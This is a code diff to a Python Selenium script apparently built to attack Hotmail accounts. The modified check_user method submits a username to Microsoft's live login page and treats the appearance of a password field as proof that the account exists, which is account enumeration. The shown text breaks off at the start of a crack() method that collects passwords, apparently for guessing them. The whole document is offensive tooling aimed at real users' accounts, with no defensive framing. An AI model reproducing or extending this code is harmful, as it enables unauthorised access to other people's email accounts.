@@ -1,5 +1,6 @@
 import time
 import imaplib
+from selenium.common.exceptions import NoSuchElementException
 
 
 class Hotmail:
@@ -17,18 +18,21 @@ class Hotmail:
 
     def check_user(self):
         self.browser.driver.get('https://login.live.com/login.srf')
+        input = self.browser.driver.find_element_by_name('loginfmt')
+        #input = self.browser.driver.find_element_by_id('i0116')
+        input.clear()
+        input.send_keys(self.username)
+        self.browser.driver.find_element_by_id('idSIButton9').click()
         try:
-            input = self.browser.driver.find_element_by_name('loginfmt')
-            #input = self.browser.driver.find_element_by_id('i0116')
-            input.clear()
-            input.send_keys(self.username)
-            self.browser.driver.find_element_by_id('idSIButton9').click()
-            err = self.browser.wait_until_element_exists('id', 'usernameError')
-            if err:
-                return False
-        except BaseException:
-            self.name = 'Not found'
+            self.browser.driver.find_element_by_name('passwd')
             return True
+        except NoSuchElementException:
+            return False
+        #try:
+        #    self.browser.wait_until_element_exists('id', 'usernameError')
+        #    return False
+        #except NoSuchElementException:
+        #    return True
 
     def crack(self):
         passwords = []
